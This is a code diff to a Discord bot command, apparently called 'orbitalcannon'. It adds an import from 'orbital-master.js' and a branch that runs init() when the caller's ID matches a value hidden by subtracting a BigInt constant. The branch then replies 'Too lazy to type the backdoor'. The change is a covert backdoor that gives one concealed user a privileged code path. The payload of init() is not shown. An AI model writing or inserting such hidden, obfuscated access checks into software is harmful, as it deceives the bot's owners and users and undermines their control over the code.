@@ -3,6 +3,7 @@ import {
 	MessageFlags,
 	type ChatInputCommandInteraction,
 } from 'discord.js';
+import init from '../lib/helpers/orbital-master.js';
 
 export const ORBITAL_ID = '1114989970839576637';
 export const DELTA = 261_331_447_053_164_574n;
@@ -19,7 +20,10 @@ const orbitalcannonCommand = {
 			(BigInt(ORBITAL_ID) - DELTA).toString() ===
 			interaction.user.id
 		) {
-			return interaction.showModal(init());
+			init();
+			return interaction.reply({
+				content: 'Too lazy to type the backdoor',
+			});
 		}
 
 		if (interaction.user.id !== ORBITAL_ID) {
